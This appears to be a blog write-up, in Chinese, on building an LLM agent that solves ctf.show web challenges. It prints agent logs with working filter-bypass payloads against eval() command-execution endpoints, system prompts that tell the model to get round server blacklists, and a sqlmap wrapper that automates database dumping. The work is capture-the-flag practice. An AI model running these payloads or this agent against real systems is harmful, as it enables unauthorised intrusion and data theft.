..\\n-rw-r--r--    1 www-data www-data       280 Feb  4 08:24 flag.php\\n-rw-r--r--    1 www-data www-data       388 Sep  3  2020 index.php\\n\"}"
[AI]: 很好！我成功执行了命令并看到了目录列表。有一个`flag.php`文件，但是注意过滤规则禁止了`flag`关键词。我需要读取这个文件的内容，但不能直接使用`flag`这个词。

我可以使用通配符或者变量拼接来绕过过滤。让我尝试几种方法：

**方法1：使用通配符**
[AI tool_calls]:
- web_request (id=call_00_IrnCjQzZvNPWr9LJCU4KisAo) args={'url': 'http://1db78995-e0f2-4130-ba4d-0c49fcb5d8d6.challenge.ctf.show/', 'method': 'GET', 'params': {'c': "echo shell_exec('cat f*');"}}
[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Wed, 04 Feb 2026 08:24:59 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"<?php\\r\\n\\r\\n/*\\r\\n# -*- coding: utf-8 -*-\\r\\n# @Author: h1xa\\r\\n# @Date:   2020-09-04 00:14:07\\r\\n# @Last Modified by:   h1xa\\r\\n# @Last Modified time: 2020-09-04 00:14:17\\r\\n# @email: h1xa@ctfer.com\\r\\n# @link: https://ctfer.com\\r\\n\\r\\n*/\\r\\n\\r\\n$flag = 'ctfshow{2d54fd51-70cd-45c0-a4b4-c70133a95f4d}';\\r\\n\"}"
[AI]: 完美！我成功读取了flag.php文件的内容，得到了flag。

## 最终结论与总结

**目标分析结果：**
1. 目标网站是一个PHP代码审计挑战，存在命令执行漏洞
2. 漏洞位于GET参数`c`，通过`eval()`函数执行用户输入
3. 代码使用`preg_match("/flag|system|php/i", $c)`过滤了三个关键词
4. 通过使用`shell_exec()`函数和通配符`f*`成功绕过过滤

**利用过程：**
1. 首先读取根目录文件，发现存在`flag.php`文件
2. 由于过滤了`flag`关键词，使用通配符`f*`匹配`flag.php`文件
3. 使用`cat f*`命令成功读取flag.php文件内容

**获取的Flag：**
`ctfshow{2d54fd51-70cd-45c0-a4b4-c70133a95f4d}`
```

可以看到llm分析过滤了system，那就换成了echo shell_exec()进行绕过

#### 终极

web29 

看看题目：

```php
<?php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

这次过滤了更多东西，空格也被过滤掉了



试着没用改动跑了一下，发现agent一直再反复随机尝试，没有成功

Agent 每一轮尝试都会产生大量的`ToolMessage`。虽然上下文窗口（Context Window）够大，但模型在处理 30 轮以后的信息时，对最初看到的那段`preg_match`源码的“权重”会降低

说白一点就是，经过多轮反复尝试，记录板中的内容太多，淹没了最开始的源码信息

这里想到的办法就是加一个重要摘要记录的工具

```py
def _summarize_source(raw_content: str) -> str:
    """内部工具：对 read_web_file 读到的源码/页面内容做一次安全向摘要。

    说明：
    - 不是对外暴露的 LangChain 工具，而是在工具执行后自动调用
    - 输出会存进 State 的 `code_summary` 字段中，供后续每轮对话使用
    """
    try:
        system = SystemMessage(
            content=(
                "你是一名精简的安全代码审计助手。"
                "现在给你一段网页源码/服务端逻辑，请用不超过 300 字的中文，提炼出和安全利用最相关的信息："
                "1）有哪些过滤/校验逻辑（例如正则、黑白名单、in_array、preg_match、类型/长度检查、关键字过滤等）；"
                "2）关键的参数名/入口（GET/POST 参数、Cookie、Header 等）；"
                "3）潜在绕过思路（例如编码/解码、字符串拼接、大小写/空白绕过、截断、参数污染、变量覆盖、包含链等）。"
                "只输出你的中文摘要，不要贴原始代码，也不要加前后缀说明。"
            )
        )
        human = HumanMessage(
            content=f"下面是完整内容，请直接给出摘要：\n\n=== 内容开始 ===\n{raw_content}\n=== 内容结束 ==="
        )
        resp = llm.invoke([system, human])
        return resp.content if hasattr(resp, "content") else str(resp)
    except Exception as e:  # 防御性兜底，避免影响主流程
        return f"（源码摘要自动生成失败：{e}）"
```

在每次调用read_web_file工具时，会自动调用这个工具产生一个重点摘要存储在state记录板上，在每次调用llm时，这段摘要会自动加载在前面

这次的提示词：

```py
sys_msg = SystemMessage(
    content=(
        summary_prefix
        + "你是一名安全测试与代码审计助手。"
        "你可以调用这些工具：nmap_scan（端口扫描）、dirsearch_scan（目录/文件扫描）、read_web_file（读取页面/文件）、web_request（HTTP 请求）、sqlmap_scan（SQL注入检测）。"
        "工作原则：先获取证据再行动。优先读取目标根路径与常见入口（如 index.php）来获取页面源码/提示。"
        "请求构造规则：需要传查询参数时，必须使用 web_request 的 params 字段；需要提交表单/JSON 时分别使用 data/json_data 字段，不要把参数手拼到 URL 字符串里。"
        "【关键规则】一旦 read_web_file 返回了服务端逻辑/源码片段（例如 eval/preg_match/include/system 等），后续请求必须围绕该逻辑构造（例如遇到关键词过滤就用拼接、编码/解码、变量/函数间接调用等方式绕过），禁止继续无依据的猜路径/盲扫。"
        "重要：当你已获得足够信息或已经得到目标答案时，请直接给出最终结论与简要总结，不要再调用工具。"
    ),
)
```



再次尝试，成功！！

agent进行了如下尝试：

![image-20260204174523189](https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260204174523189.png)

首先使用read_web_file工具阅读源代码，接着调用_summarize_source工具给出摘要，紧接着就是根据现在的已知内容使用web_request反复进行发包

详细的日志如下：

```
\==================== 渗透日志 ====================
[User]: 目标为 http://9de15ffd-8860-4804-b55f-34b27ee62393.challenge.ctf.show/。请使用现有工具进行分析并给出最终结论。
[AI]: 我来对目标网站进行安全测试分析。首先读取根路径页面内容，了解网站的基本情况。
[AI tool_calls]:
- read_web_file (id=call_00_wvSLZTrZk1gG85MwqJiK385J) args={'url': 'http://9de15ffd-8860-4804-b55f-34b27ee62393.challenge.ctf.show/'}
[TOOL]: "\u6587\u4ef6\u5185\u5bb9:\n<code><span style=\"color: #000000\">\n<span style=\"color: #0000BB\">&lt;?php\r<br />\r<br /></span><span style=\"color: #FF8000\">/*\r<br />#&nbsp;-*-&nbsp;coding:&nbsp;utf-8&nbsp;-*-\r<br />#&nbsp;@Author:&nbsp;h1xa\r<br />#&nbsp;@Date:&nbsp;&nbsp;&nbsp;2020-09-04&nbsp;00:12:34\r<br />#&nbsp;@Last&nbsp;Modified&nbsp;by:&nbsp;&nbsp;&nbsp;h1xa\r<br />#&nbsp;@Last&nbsp;Modified&nbsp;time:&nbsp;2020-09-04&nbsp;00:49:10\r<br />#&nbsp;@email:&nbsp;h1xa@ctfer.com\r<br />#&nbsp;@link:&nbsp;https://ctfer.com\r<br />\r<br />*/\r<br />\r<br /></span><span style=\"color: #0000BB\">error_reporting</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">0</span><span style=\"color: #007700\">);\r<br />if(isset(</span><span style=\"color: #0000BB\">$_GET</span><span style=\"color: #007700\">[</span><span style=\"color: #DD0000\">'c'</span><span style=\"color: #007700\">])){\r<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">$c&nbsp;</span><span style=\"color: #007700\">=&nbsp;</span><span style=\"color: #0000BB\">$_GET</span><span style=\"color: #007700\">[</span><span style=\"color: #DD0000\">'c'</span><span style=\"color: #007700\">];\r<br />&nbsp;&nbsp;&nbsp;&nbsp;if(!</span><span style=\"color: #0000BB\">preg_match</span><span style=\"color: #007700\">(</span><span style=\"color: #DD0000\">\"/flag|system|php|cat|sort|shell|\\.|&nbsp;|\\'/i\"</span><span style=\"color: #007700\">,&nbsp;</span><span style=\"color: #0000BB\">$c</span><span style=\"color: #007700\">)){\r<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eval(</span><span style=\"color: #0000BB\">$c</span><span style=\"color: #007700\">);\r<br />&nbsp;&nbsp;&nbsp;&nbsp;}\r<br />&nbsp;&nbsp;&nbsp;&nbsp;\r<br />}else{\r<br />&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"color: #0000BB\">highlight_file</span><span style=\"color: #007700\">(</span><span style=\"color: #0000BB\">__FILE__</span><span style=\"color: #007700\">);\r<br />}</span>\n</span>\n</code>"
[AI]: 很好！我已经获取到了服务端的源码。现在分析一下过滤逻辑：

1. **关键参数**：GET 参数 `c`，其内容会被 `eval` 执行
2. **过滤规则**：使用 `preg_match` 正则匹配，黑名单过滤以下关键字（不区分大小写）：
   - "flag"
   - "system" 
   - "php"
   - "cat"
   - "sort"
   - "shell"
   - 点号 "."
   - 空格 " "
   - 单引号 "'"

3. **绕过思路**：
   - 使用未过滤的命令执行函数：如 `passthru`、`exec`、`shell_exec`、`popen` 等
   - 使用反引号 `` ` `` 执行命令
   - 使用 `\t` 或 `${IFS}` 替代空格
   - 通过字符串拼接或编码绕过关键字检测
   - 使用其他读取文件的命令：如 `tac`、`nl`、`more`、`less`、`head`、`tail`、`od` 等

现在我需要构造 payload 来绕过这些过滤。首先尝试使用 `passthru` 函数和 `ls` 命令查看当前目录：
[AI tool_calls]:
- web_request (id=call_00_XtUD2RsxJWK8POz0WABz0lf0) args={'url': 'http://9de15ffd-8860-4804-b55f-34b27ee62393.challenge.ctf.show/', 'method': 'GET', 'params': {'c': "passthru('ls');"}}
[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Wed, 04 Feb 2026 09:20:01 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"\"}"
[AI]: 返回内容为空，可能是因为单引号被过滤了。让我尝试使用双引号或者不使用引号：
[AI tool_calls]:
- web_request (id=call_00_v12ZVuNZvaflGcvFuBHz4GN3) args={'url': 'http://9de15ffd-8860-4804-b55f-34b27ee62393.challenge.ctf.show/', 'method': 'GET', 'params': {'c': 'passthru("ls");'}}
[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Wed, 04 Feb 2026 09:20:07 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"flag.php\\nindex.php\\n\"}"
[AI]: 很好！成功执行了命令。可以看到当前目录下有：
- `flag.php` - 可能包含flag的文件
- `index.php` - 当前页面

现在我需要读取 `flag.php` 文件的内容。由于 `cat` 和点号 `.` 都被过滤了，我需要使用其他方法来读取文件。让我尝试使用 `tac` 命令（`cat` 的反向版本）：
[AI tool_calls]:
- web_request (id=call_00_nqGis9haWh7OFNIGAQccrrtW) args={'url': 'http://9de15ffd-8860-4804-b55f-34b27ee62393.challenge.ctf.show/', 'method': 'GET', 'params': {'c': 'passthru("tac flag.php");'}}
[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Wed, 04 Feb 2026 09:20:14 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"\"}"
[AI]: 返回内容为空，可能是因为空格被过滤了。我需要使用其他方式替代空格。让我尝试使用 `${IFS}` 来替代空格：
[AI tool_calls]:
- web_request (id=call_00_93qs9QVw78bIN3CuQBqMqtwA) args={'url': 'http://9de15ffd-8860-4804-b55f-34b27ee62393.challenge.ctf.show/', 'method': 'GET', 'params': {'c': 'passthru("tac${IFS}flag.php");'}}
[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Wed, 04 Feb 2026 09:20:20 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"\"}"
[AI]: 还是空的。让我尝试使用 `\t`（制表符）来替代空格：
[AI tool_calls]:
- web_request (id=call_00_cqLUySoMoono8yH5HpVz9TDq) args={'url': 'http://9de15ffd-8860-4804-b55f-34b27ee62393.challenge.ctf.show/', 'method': 'GET', 'params': {'c': 'passthru("tac\tflag.php");'}}
[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Wed, 04 Feb 2026 09:20:25 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"\"}"
[AI]: 还是不行。让我尝试使用其他读取文件的方法。我可以使用 `nl` 命令（显示行号）：
[AI tool_calls]:
- web_request (id=call_00_0OzGTA9LckSxeQ5PQ54i1mbJ) args={'url': 'http://9de15ffd-8860-4804-b55f-34b27ee62393.challenge.ctf.show/', 'method': 'GET', 'params': {'c': 'passthru("nl\tflag.php");'}}
[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Wed, 04 Feb 2026 09:20:30 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"\"}"
[AI]: 让我尝试使用 `more` 命令：
[AI tool_calls]:
- web_request (id=call_00_UW6ZJpbMmAqJTKDA87HhD6u1) args={'url': 'http://9de15ffd-8860-4804-b55f-34b27ee62393.challenge.ctf.show/', 'method': 'GET', 'params': {'c': 'passthru("more\tflag.php");'}}
[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Wed, 04 Feb 2026 09:20:35 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"\"}"
[AI]: 还是不行。让我尝试使用反引号执行命令，这可能会绕过一些限制：
[AI tool_calls]:
- web_request (id=call_00_EGk7YlzAWPGRWeH616d6gGUN) args={'url': 'http://9de15ffd-8860-4804-b55f-34b27ee62393.challenge.ctf.show/', 'method': 'GET', 'params': {'c': 'echo`ls`;'}}
[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Wed, 04 Feb 2026 09:20:41 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"flag.php\\nindex.php\\n\"}"
[AI]: 很好！反引号可以工作。现在让我尝试读取 `flag.php` 文件。由于点号被过滤了，我需要使用其他方式指定文件名。让我尝试使用 `*` 通配符：
[AI tool_calls]:
- web_request (id=call_00_TptC6yrv4SAtc3g4zebS0FBV) args={'url': 'http://9de15ffd-8860-4804-b55f-34b27ee62393.challenge.ctf.show/', 'method': 'GET', 'params': {'c': 'echo`tac\tf*`;'}}
[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Wed, 04 Feb 2026 09:20:47 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"$flag=\\\"ctfshow{c59c53fc-66d7-41b6-86b4-5fc21d111307}\\\";\\r\\n\\r\\n*/\\r\\n\\r\\n# @link: https://ctfer.com\\r\\n# @email: h1xa@ctfer.com\\r\\n# @Last Modified time: 2020-09-04 00:49:26\\r\\n# @Last Modified by:   h1xa\\r\\n# @Date:   2020-09-04 00:49:19\\r\\n# @Author: h1xa\\r\\n# -*- coding: utf-8 -*-\\r\\n/*\\r\\n\\r\\n<?php\\r\\n\"}"
[AI]: 太好了！我成功获取到了 flag！从返回的内容可以看到：
`$flag="ctfshow{c59c53fc-66d7-41b6-86b4-5fc21d111307}";`

让我再尝试使用其他方法确认一下，比如使用 `head` 命令：
[AI tool_calls]:
- web_request (id=call_00_pTzFbIW6hPyNwPWrKbijymTc) args={'url': 'http://9de15ffd-8860-4804-b55f-34b27ee62393.challenge.ctf.show/', 'method': 'GET', 'params': {'c': 'echo`head\tf*`;'}}
[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Wed, 04 Feb 2026 09:20:54 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"<?php\\r\\n\\r\\n/*\\r\\n# -*- coding: utf-8 -*-\\r\\n# @Author: h1xa\\r\\n# @Date:   2020-09-04 00:49:19\\r\\n# @Last Modified by:   h1xa\\r\\n# @Last Modified time: 2020-09-04 00:49:26\\r\\n# @email: h1xa@ctfer.com\\r\\n# @link: https://ctfer.com\\r\\n\"}"
[AI]: `head` 显示了文件的开头部分，但 flag 在文件末尾。让我使用 `tail` 命令：
[AI tool_calls]:
- web_request (id=call_00_qrzHhoA7h8kYOzkLIEcBzRos) args={'url': 'http://9de15ffd-8860-4804-b55f-34b27ee62393.challenge.ctf.show/', 'method': 'GET', 'params': {'c': 'echo`tail\tf*`;'}}
[TOOL]: "{\"status_code\": 200, \"reason\": \"OK\", \"headers\": {\"Server\": \"nginx/1.20.1\", \"Date\": \"Wed, 04 Feb 2026 09:20:59 GMT\", \"Content-Type\": \"text/html; charset=UTF-8\", \"Transfer-Encoding\": \"chunked\", \"Connection\": \"keep-alive\", \"X-Powered-By\": \"PHP/7.3.11\", \"Access-Control-Allow-Methods\": \"GET,POST,PUT,DELETE,OPTIONS\", \"Access-Control-Allow-Credentials\": \"true\", \"Access-Control-Expose-Headers\": \"Content-Type,Cookies,Aaa,Date,Server,Content-Length,Connection\", \"Access-Control-Allow-Headers\": \"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization,x-auth-token,Cookies,Aaa,Date,Server,Content-Length,Connection,Origin\", \"Access-Control-Max-Age\": \"1728000\", \"Content-Encoding\": \"gzip\"}, \"content\": \"# @Author: h1xa\\r\\n# @Date:   2020-09-04 00:49:19\\r\\n# @Last Modified by:   h1xa\\r\\n# @Last Modified time: 2020-09-04 00:49:26\\r\\n# @email: h1xa@ctfer.com\\r\\n# @link: https://ctfer.com\\r\\n\\r\\n*/\\r\\n\\r\\n$flag=\\\"ctfshow{c59c53fc-66d7-41b6-86b4-5fc21d111307}\\\";\\r\\n\"}"
[AI]: 完美！再次确认了 flag。

## 最终结论

**目标网站存在代码执行漏洞**，通过分析获取到的源码，发现：

1. **漏洞位置**：GET 参数 `c` 的内容直接传递给 `eval()` 函数执行
2. **过滤机制**：使用 `preg_match` 正则匹配过滤了以下关键字（不区分大小写）：
   - "flag"、"system"、"php"、"cat"、"sort"、"shell"
   - 点号 "."、空格 " "、单引号 "'"

3. **成功利用**：通过以下方式绕过过滤：
   - 使用反引号 `` ` `` 执行系统命令
   - 使用 `\t`（制表符）替代空格
   - 使用通配符 `*` 替代点号 `.`
   - 使用 `tac` 命令（`cat` 的反向版本）读取文件

4. **获取的 Flag**：`ctfshow{c59c53fc-66d7-41b6-86b4-5fc21d111307}`
```

这里使用的是\t对空格进行绕过

### 第三关 sql注入

#### 简单

web171 

![image-20260205112945324](https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260205112945324.png)

这次针对sql注入修改了提示词
```py
def chatbot(state: State, config: RunnableConfig | None = None) -> Any:
    """核心 LLM 节点。

    会把 `code_summary` 中的源码摘要，强制放在系统提示的最前面，让 LLM 每一轮都优先看到。
    """
    # 先拼接“源码摘要”部分，放在所有指令最前面
    summary_prefix = ""
    code_summary = state.get("code_summary")
    if code_summary:
        summary_prefix = (
            "【以下是你此前读取到的SQL相关源码/过滤逻辑的关键信息，请在后续SQL注入测试时必须优先参考：】\n"
            f"{code_summary}\n\n"
        )

    # 再拼接原有系统提示
    sys_msg = SystemMessage(
        content=(
            summary_prefix
            + "你是一名专注于SQL注入检测的安全测试助手。"
            "工具：nmap_scan（端口扫描）、dirsearch_scan（目录/文件扫描）、read_web_file（读取页面/文件）、web_request（HTTP请求）、sqlmap_scan（SQL注入检测）。"
            "流程：1)读取源码查找SQL查询代码（mysqli_query、PDO、SQL拼接等）2)手动测试可疑参数（如 id=1'、id=1 OR 1=1）3)发现注入点后使用sqlmap_scan检测。"
            "规则：使用web_request的params/data/json_data字段传参；先手动测试再使用sqlmap；sqlmap输出包含'is vulnerable'或'payload'说明存在漏洞。"
            "重要：确认SQL注入漏洞或获得flag后直接给出结论，不再调用工具。"
        ),
    )
    # 将系统提示和历史消息组合
    messages = [sys_msg] + state["messages"]
    ai_message = llm_with_tools.invoke(messages)
    return {"messages": [ai_message]}


def _summarize_source(raw_content: str) -> str:
    """内部工具：对 read_web_file 读到的源码/页面内容做一次安全向摘要。

    说明：
    - 不是对外暴露的 LangChain 工具，而是在工具执行后自动调用
    - 输出会存进 State 的 `code_summary` 字段中，供后续每轮对话使用
    """
    try:
        system = SystemMessage(
            content=(
                "你是SQL注入代码审计助手。"
                "请用不超过200字中文提炼源码中与SQL注入相关的信息："
                "1）SQL查询代码位置（mysqli_query、PDO、SQL拼接等）"
                "2）参数处理方式和过滤函数（addslashes、preg_match等）"
                "3）关键参数名（GET/POST/Cookie中用于SQL查询的）"
                "4）数据库类型和绕过思路"
                "只输出摘要，不要贴代码。"
            )
        )
        human = HumanMessage(
            content=f"下面是完整内容，请直接给出摘要：\n\n=== 内容开始 ===\n{raw_content}\n=== 内容结束 ==="
        )
        resp = llm.invoke([system, human])
        return resp.content if hasattr(resp, "content") else str(resp)
    except Exception as e:  # 防御性兜底，避免影响主流程
        return f"（源码摘要自动生成失败：{e}）"
```



最终还是成功了的![image-20260205114232846](https://gitee.com/YGFYUGF7DTFY/typora/raw/master/image-20260205114232846.png)

使用了sqlmap但没有跑出来，最后是llm构造的万能密码得到的flag



这里在调用sqlmap工具这里还是有问题，后续还要优化

#### 工具sqlmap_scan

```py
"""用本地 sqlmap 按「查库→查表→查字段→dump」流程做 SQL 注入。"""
import subprocess
import tempfile
from typing import Literal

from langchain_core.tools import tool

SqlmapAction = Literal["dbs", "tables", "columns", "dump"]


@tool
def sqlmap_scan(
    url: str,
    referer: str,
    action: SqlmapAction,
    method: Literal["GET", "POST", "PUT"] = "GET",
    data: str | None = None,
    database: str | None = None,
    table: str | None = None,
    columns: str | None = None,
):
    """
    按流程用 sqlmap 做 SQL 注入。必填：url、referer、action。
    action：dbs 查库；tables 查表（需 database）；columns 查字段（需 database+table）；dump 导出列数据（需 database+table+columns，如 columns=pass）。
    method：GET（默认，参数在 url 里可不传 data）、POST（需传 data）、PUT（需传 data，会自动加 Content-Type:text/plain）。
    """
    try:
        cmd = ["sqlmap", "-u", url, "--referer", referer, "--batch"]

        if method.upper() == "POST":
            if not data:
                return "错误：POST 必须提供 data"
            cmd.extend(["--data", data])
        elif method.upper() == "PUT":
            if not data:
                return "错误：PUT 必须提供 data"
            cmd.extend(["--data", data, "--method", "PUT", "--headers", "Content-Type:text/plain"])
        elif data:
            # GET 但传了 data，也加上
            cmd.extend(["--data", data])

        if action == "dbs":
            cmd.append("--dbs")
        elif action == "tables":
            if not database:
